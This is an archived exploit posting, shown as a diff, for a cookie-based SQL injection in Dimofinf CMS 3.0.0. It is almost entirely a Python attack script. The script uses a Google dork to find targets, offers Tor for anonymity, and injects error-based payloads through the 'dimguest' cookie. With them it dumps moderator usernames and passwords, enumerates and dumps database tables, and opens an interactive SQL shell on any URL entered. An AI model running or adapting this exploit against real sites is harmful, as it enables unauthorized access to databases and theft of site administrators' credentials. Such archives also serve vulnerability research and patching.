@@ -1,0 +1,246 @@
+id: 24610
+date: 11/25/2015
+title: Dimofinf 3.0.0 SQL Injection Vulnerability
+author: D35m0nd142
+cves: 
+
+# Dimofinf CMS Automatic Cookie SQL Injection exploit
+# Google Dork: intext:"Powered by Dimofinf"
+# Date: 19/11/2015
+# Author: D35m0nd142
+# Software link: http://www.dimofinf.net
+# Version: 3.0.0
+# Tested on: Dimofinf version 3.0.0
+# Sometimes it happens that the vulnerability allow you to get moderators' username and password but not the list of tables and columns 
+# or viceversa; So if one of them does not work, you could try the other one anyway.
+
+#!/usr/bin/python
+import socks
+import socket
+import requests
+import sys,os,time
+from random import randint
+
+check = "Duplicate entry '"
+tor_addr = "127.0.0.1"
+tor_port = 9150
+agents = ["Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0","Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.132 Safari/537.36",
+      "IBM WebExplorer /v0.94","Mozilla/5.0 (Windows; U; Windows NT 6.1; x64; fr; rv:1.9.2.13) Gecko/20101203 Firebird/3.6.13",
+      "Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A"]
+rand = randint(0,9)
+url = ""
+headers = {'User-Agent':agents[rand%len(agents)]}
+
+def removeDot(s):
+  return s[1:]
+
+def extract(out):
+  start = 0
+  for x in range(0,len(out)-len(check)):
+    beset = True
+    for k in range(0,17):
+      if(out[x+k] != check[k]):
+        beset = False
+    if(beset):
+      start = x+17
+      break
+  got = ""
+  for x in range(start,len(out)):
+    if(out[x] == '~'):
+      break
+    got += out[x]
+  return got
+
+def req(cookies):
+  global headers
+  r = requests.get(url,cookies=cookie,headers=headers)
+  out = r.text
+  return out
+
+print "\n-----------------------------------------------------------"
+print "Dimofinf CMS v3.0.0 Automatic Cookie SQL Injection exploit"
+print "Author: D35m0nd142"
+print "-----------------------------------------------------------"
+
+url = raw_input("\nEnter URL -> ") 
+if("http" not in url):
+  url = "http://%s" %url
+tor = raw_input("Do you want to use TOR? (y/n) ")
+
+if(tor == "y" or tor == "Y" or tor == "yes"):
+  try:
+    socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, tor_addr, tor_port)
+    socket.socket = socks.socksocket
+  except requests.ConnectionError as e:
+    print "[ERROR] Could not connect to TOR"
+    sys.exit(1)
+
+session = requests.Session()
+response = session.get(url)
+s = str(session.cookies.get_dict())
+
+if("dimguest" in s):
+  i = 0
+  print "\n[+] 'dimguest' cookie found. Checking exploitability.."
+  cookie = {'dimguest':'1\''}
+  r = requests.get(url,cookies=cookie,headers=headers)
+
+  choice = "nope"
+  if("Database Error" in r.text and "Invalid SQL" in r.text and "You have an error in your SQL" in r.text):
+    print "[+] Target seems to be exploitable (SQL error found)."
+    cookie = {'dimguest':'1\' and (select 1 from (select count(*),concat(0x3a,(select user()),0x7e,floor(rand(0)*2))a from information_schema.tables group by a)x)#'}
+    out = req(cookie)
+    current = extract(out)
+
+    if(len(current) < 70):
+      print "[+] Current User: %s" %(removeDot(current))
+    else:
+      print "[+] Current User: ?"
+
+    print "\n----------------------------------------"
+    print " 1) Get moderators' usernames:passwords"
+    print " 2) Browse DB (wizard)"
+    print " 3) SQL shell (difficult)"
+    print "----------------------------------------"
+    choice = raw_input(" -> ")
+    print ""
+
+    if(choice == "1"):
+      cookie = {'dimguest':'1\' and (select 1 from (select count(*),concat(0x3a,(select Concat(username,0x3a,password) from moderators limit %s,1),0x7e,floor(rand(0)*2))a from information_schema.tables group by a)x)#' %i}
+      out = req(cookie)
+
+      while(check in out):
+        got = extract(out)
+
+        if(len(got) > 0):
+          print "[+] GOT: '%s'" %(removeDot(got))
+        i += 1
+        cookie = {'dimguest':'1\' and (select 1 from (select count(*),concat(0x3a,(select Concat(username,0x3a,password) from moderators limit %s,1),0x7e,floor(rand(0)*2))a from information_schema.tables group by a)x)#' %i}
+        out = req(cookie)
+
+    elif(choice == "2"):
+      print "[*] Gathering tables..\n"
+      
+      cookie = {'dimguest':'1\' and (select 1 from (select count(*),concat(0x3a,(select Concat(table_name) from information_schema.tables where table_schema=database() limit %s,1),0x7e,floor(rand(0)*2))a from information_schema.tables group by a)x)#' %i}
+      out = req(cookie)
+
+      while(check in out):
+        got = extract(out)
+        if(len(got) > 0):
+          print "[Table] '%s'" %(removeDot(got))
+        i += 1
+        cookie = {'dimguest':'1\' and (select 1 from (select count(*),concat(0x3a,(select Concat(table_name) from information_schema.tables where table_schema=database() limit %s,1),0x7e,floor(rand(0)*2))a from information_schema.tables group by a)x)#' %i}
+        out = req(cookie)
+
+      if(i == 0):
+        print "[-] Any table found :("
+      
+      tables = raw_input("\nEnter the tables (separated by ',') of which you want the columns -> ")
+      mytables = []
+
+      tmp = ""
+      for x in range(0,len(tables)):
+        if(tables[x] == ',' or x == len(tables)-1):
+          if(x == len(tables)-1):
+            tmp += tables[x]
+          mytables.append(tmp)
+          tmp = ""
+        else:
+          tmp += tables[x]
+
+      for table in mytables:
+        col_check = []
+        k = 0
+        print "\n[+] Columns in '%s':\n" %table
+        cookie = {'dimguest':'1\' and (select 1 from (select count(*),concat(0x3a,(select Concat(column_name) from information_schema.columns where table_name=\'%s\' limit %s,1),0x7e,floor(rand(0)*2))a from information_schema.tables group by a)x)#' %(table,k)}
+        out = req(cookie)
+
+        while(check in out):
+          got = extract(out)
+          if(got in col_check):
+            break
+          if(len(got) > 0):
+            col_check.append(got)
+            print "  [Column] '%s'" %(removeDot(got))
+          k += 1
+          cookie = {'dimguest':'1\' and (select 1 from (select count(*),concat(0x3a,(select Concat(column_name) from information_schema.columns where table_name=\'%s\' limit %s,1),0x7e,floor(rand(0)*2))a from information_schema.tables group by a)x)#' %(table,k)}
+          out = req(cookie)
+
+      if(k == 0):
+        print "[-] Any column found :("
+      
+      dump = "nope"
+      while(dump != "exit" and dump != "quit"):
+        dump = raw_input("\nEnter the table and columns you want to dump (ex: table_name:column1,column2) -> ")
+
+        if(dump == "exit" or dump == "quit"):
+          break
+        gotTable = False
+        table = ""
+        cols = []
+        col = ""
+        for x in range(0,len(dump)):
+          if(gotTable is False and dump[x] == ':'):
+            gotTable = True
+            x += 1
+          if(gotTable is False):
+            table += dump[x]
+          else:
+            if(dump[x] == ',' or x == len(dump)-1):
+              if(x == len(dump)-1):
+                col += dump[x]
+              cols.append(col)
+              col = ""
+            else:
+              col += dump[x]
+
+        if(len(cols) > 0):
+          cols[0] = (cols[0])[1:]
+        print cols
+
+        print "\n[*] Dumping..\n"
+
+        query = "1' and (select 1 from (select count(*),concat(0x3a,(select Concat("
+        for colu in cols:
+          query += "%s,0x3a," %colu
+        query = query[:-1]
+
+        z = 0
+        query += ") from %s limit " %table
+
+        while(True):
+          snip = "%s,1),0x7e,floor(rand(0)*2))a from information_schema.tables group by a)x)#" %z
+          z += 1
+          myquery = query+snip
+          cookie = {'dimguest':myquery}  
+          out = req(cookie)
+          if(check not in out):
+            break
+          got = extract(out)
+          print "[Dump]: '%s'" %(removeDot(got))
+        print ""
+
+    elif(choice == "3"):
+      print "[*] Opening SQL shell..\n"
+      time.sleep(0.6)
+      cmd = ""
+      while(cmd != "exit" and cmd != "quit"):
+        cmd = raw_input("SQL-shell> ")
+        if(cmd == "exit" or cmd == "quit"):
+          break
+        cookie = {'dimguest':'1\' and (%s)#' %cmd}
+        out = req(cookie)
+        got = extract(out)
+        print "qui"
+        print "[+] GOT: '%s'\n" %(removeDot(got))
+    else:
+      print "[INPUT ERROR] You entered a not valid choice!"
+      sys.exit(1)
+
+  if(i==0 and choice != "3"):
+    print "[-] '%s' not vulnerable, or patched." %url
+
+else:
+  print "\n[+] Target not vulnerable. (cookie 'dimguest' not found.)"
+
+#  0day.today [2023-03-22]  #
